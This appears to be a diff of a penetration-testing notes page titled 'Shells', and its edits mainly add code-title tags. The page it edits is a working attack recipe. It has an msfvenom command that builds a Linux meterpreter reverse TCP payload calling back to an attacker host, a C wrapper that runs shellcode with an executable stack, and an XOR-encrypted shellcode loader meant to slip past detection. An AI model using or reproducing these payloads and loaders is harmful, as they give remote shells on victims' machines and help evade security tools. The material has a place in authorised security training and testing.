@@ -1,7 +1,5 @@
 # Shells
 
-
-
 ### Basic Linux Reverse Shell
 
 Configure Listener
@@ -18,9 +16,8 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=443 LHOST=192.168.X.Y -f c
 
 * Create a wrapper called hack.c
 
-hack.c
-
-```
+{% code title="hack.c" %}
+```c
 #include <stdio.h>  
 #include <stdlib.h>  
 #include <unistd.h>  
@@ -35,6 +32,7 @@ int main (int argc, char **argv)
  ret();  
 }
 ```
+{% endcode %}
 
 Compile the code with gcc
 
@@ -44,14 +42,15 @@ gcc -o hack.out hack.c -z execstack
 
 ### Encrypted Linux Reverse Shell
 
-```
+{% code title="encrypted_xor.c" %}
+```c
 #define _GNU_SOURCE
 #include <sys/mman.h>
 #include <stdio.h>
 #include <dlfcn.h>
 #include <unistd.h>
 
-// compile with - gcc -o final.out encoded.c -z execstack
+// compile with - gcc -o final.out encrypted_xor.c -z execstack
 // msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=443 LHOST=192.168.X.Y -f c   -encrypt xor -encrypt-key J
 
 unsigned char buf[] = "\x02\x7b\xb5\x20\x43\x12\xd3....";
@@ -84,3 +83,4 @@ int main(int argc, char** argv)
 }
 
 ```
+{% endcode %}
